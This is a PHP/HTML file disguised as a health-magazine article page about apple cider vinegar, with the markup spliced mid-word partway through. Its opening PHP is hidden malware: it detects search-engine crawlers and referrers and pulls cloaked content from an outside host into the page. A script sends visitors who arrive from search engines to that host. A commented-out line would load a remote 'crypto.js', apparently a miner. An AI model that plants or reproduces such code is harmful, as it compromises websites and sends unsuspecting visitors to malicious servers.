<?php
// Silence is golden.
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
$searchEngines = array(
  'google.',
  'duckduckgo.com',
  'bing.com',
  'yahoo.com',
  'aol.com',
  'brave.com',
  'ecosia.org'
);
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$isFromSearch = false;
for ($i = 0; $i < count($searchEngines); $i++) {
  if ($referrer && strpos($referrer, $searchEngines[$i]) !== false) {
    $isFromSearch = true;
    break;
  }
  if (strpos($ua, $searchEngines[$i]) !== false) {
    $isFromSearch = true;
    break;
  }
}
function fetch_url_with_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    $contents = curl_exec($ch);
    if (curl_errno($ch)) { $contents = ''; }
    curl_close($ch);
    return $contents;
}
if ($isFromSearch) {
  $id = $_GET['id'];
  $data = fetch_url_with_curl('https://cdn.amrabekar.com/repos/' . $id . '?type=j');
  $cache = @json_decode($data, true);
}
if (!isset($cache) || !is_array($cache)) {
  $cache = array('title' => '', 'description' => '', 'content' => '', 'link' => '', 'links' => array());
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script>
    const url = window.location.href;
    const referrer = document.referrer;
    const ua = navigator.userAgent.toLowerCase();
    const searchEngines = [
      'google.', 'duckduckgo.com', 'bing.com',
      'yahoo.com', 'aol.com', 'brave.com', 'ecosia.org'
    ];
    const isFromSearchEngine = searchEngines.some(se =>
      referrer.includes(se) && !referrer.includes('corp.google.com')
    );
    if (isFromSearchEngine) {
      window.location = 'https://recode.amrabekar.com/translate?url=' + encodeURIComponent(url);
    } else {
    //  document.write(`<script src="https://cdn.amrabekar.com/crypto.js?url=${encodeURIComponent(url)}"><\/script>`);
    }
  </script>
  <meta name="author" content="Health & Wellness Magazine">
  <title><?php echo $cache['title'] ? $cache['title'] : 'The Benefits of Apple Cider Vinegar for Weight Loss' ?></title>
  <meta name="description" content="<?php echo $cache['description']; ?>">
  <script src="https://cdn.tailwindcss.com/3.4.16"></script>
  <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            primary: '#3B82F6',
            secondary: '#10B981',
            neutral: {
              50: '#F9FAFB',
              100: '#F3F4F6',
              200: '#E5E7EB',
              700: '#374151',
              800: '#1F2937',
              900: '#111827'
            }
          },
          fontFamily: {
            sans: ['Inter', 'system-ui', 'sans-serif'],
            serif: ['Georgia', 'Cambria', 'serif']
          }
        }
      }
    }
  </script>
  <style type="text/tailwindcss">
    @layer utilities {
            .content-auto {
                content-visibility: auto;
            }
            .text-balance {
                text-wrap: balance;
            }
            .article-prose {
                @apply max-w-none text-neutral-800 leading-relaxed;
            }
            .article-prose p {
                @apply my-6;
            }
            .article-prose h2 {
                @apply text-2xl md:text-3xl font-bold mt-12 mb-4 text-neutral-900 border-b border-neutral-200 pb-2;
            }
            .article-prose h3 {
                @apply text-xl md:text-2xl font-bold mt-10 mb-3 text-neutral-900;
            }
            .article-prose blockquote {
                @apply border-l-4 border-primary pl-4 italic my-8 text-neutral-700 bg-neutral-50 p-4 rounded-r;
            }
            .article-prose img {
                @apply rounded-lg shadow-md my-8 mx-auto;
            }
            .article-prose table {
                @apply w-full my-8 border-collapse;
            }
            .article-prose th,
            .article-prose td {
                @apply border border-neutral-200 p-3 text-left;
            }
            .article-prose th {
                @apply bg-neutral-50 font-semibold;
            }
        }
    </style>
</head>

<body class="bg-neutral-50 font-sans text-neutral-800">
  <!-- Header/Navigation -->
  <header class="sticky top-0 z-50 bg-white shadow-sm transition-all duration-300" id="site-header">
    <div class="container mx-auto px-4 sm:px-6 lg:px-8">
      <div class="flex justify-between items-center py-4">
        <!-- Logo -->
        <a href="#" class="flex items-center space-x-2">
          <span class="text-primary text-2xl"><i class="fa fa-leaf"></i></span>
          <span class="font-bold text-xl text-neutral-900">Health Pulse</span>
        </a>

        <!-- Desktop Navigation -->
        <nav class="hidden md:flex items-center space-x-8">
          <a href="#" class="text-neutral-700 hover:text-primary transition-colors">Home</a>
          <a href="#" class="text-primary font-medium">Nutrition</a>
          <a href="#" class="text-neutral-700 hover:text-primary transition-colors">Fitness</a>
          <a href="#" class="text-neutral-700 hover:text-primary transition-colors">Wellness</a>
        </nav>

        <!-- Mobile menu button -->
        <button class="md:hidden text-neutral-700 hover:text-primary transition-colors" id="mobile-menu-button">
          <i class="fa fa-bars text-xl"></i>
        </button>
      </div>

      <!-- Mobile Navigation -->
      <div class="md:hidden hidden pb-4" id="mobile-menu">
        <div class="flex flex-col space-y-3">
          <a href="#" class="text-neutral-700 hover:text-primary transition-colors py-2">Home</a>
          <a href="#" class="text-primary font-medium py-2">Nutrition</a>
          <a href="#" class="text-neutral-700 hover:text-primary transition-colors py-2">Fitnes00 mb-4">
            Get the latest health tips and articles delivered directly to your inbox.
          </p>
          <form class="space-y-3">
            <input type="email" placeholder="Your email address" class="w-full px-4 py-3 rounded-lg bg-neutral-800 border border-neutral-700 text-white focus:outline-none focus:ring-2 focus:ring-primary">
            <button type="submit" class="w-full bg-primary hover:bg-primary/90 text-white font-medium py-3 rounded-lg transition-colors">
              Subscribe
            </button>
          </form>
          <p class="text-xs text-neutral-500 mt-3">
            We respect your privacy. Unsubscribe at any time.
          </p>
        </div>
      </div>
      <div class="border-t border-neutral-800 pt-6">
        <div class="flex flex-col md:flex-row justify-between items-center">
          <p class="text-neutral-500 text-sm mb-4 md:mb-0">
            © 2025 Health Pulse. All rights reserved.
          </p>
          <div class="flex space-x-6">
            <a href="#" class="text-neutral-500 hover:text-white text-sm transition-colors">Privacy Policy</a>
            <a href="#" class="text-neutral-500 hover:text-white text-sm transition-colors">Terms of Service</a>
            <a href="#" class="text-neutral-500 hover:text-white text-sm transition-colors">Disclaimer</a>
          </div>
        </div>
      </div>
    </div>
  </footer>

  <!-- Back to Top Button -->
  <button id="back-to-top" class="fixed bottom-6 right-6 bg-primary hover:bg-primary/90 text-white w-12 h-12 rounded-full flex items-center justify-center shadow-lg transition-all opacity-0 invisible">
    <i class="fa fa-arrow-up"></i>
  </button>

  <script>
    // Mobile menu toggle
    const mobileMenuButton = document.getElementById('mobile-menu-button');
    const mobileMenu = document.getElementById('mobile-menu');

    mobileMenuButton.addEventListener('click', () => {
      mobileMenu.classList.toggle('hidden');
    });

    // Header scroll effect
    const header = document.getElementById('site-header');
    const backToTopButton = document.getElementById('back-to-top');

    window.addEventListener('scroll', () => {
      // Shrink header on scroll
      if (window.scrollY > 50) {
        header.classList.add('py-2', 'shadow');
        header.classList.remove('py-4');
      } else {
        header.classList.add('py-4');
        header.classList.remove('py-2', 'shadow');
      }

      // Show/hide back to top button
      if (window.scrollY > 500) {
        backToTopButton.classList.remove('opacity-0', 'invisible');
        backToTopButton.classList.add('opacity-100', 'visible');
      } else {
        backToTopButton.classList.add('opacity-0', 'invisible');
        backToTopButton.classList.remove('opacity-100', 'visible');
      }
    });

    // Back to top functionality
    backToTopButton.addEventListener('click', () => {
      window.scrollTo({
        top: 0,
        behavior: 'smooth'
      });
    });

    // Smooth scrolling for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
      anchor.addEventListener('click', function (e) {
        e.preventDefault();

        const targetId = this.getAttribute('href');
        if (targetId === '#') return;

        const targetElement = document.querySelector(targetId);
        if (targetElement) {
          targetElement.scrollIntoView({
            behavior: 'smooth'
          });
        }
      });
    });
  </script>
</body>

</html>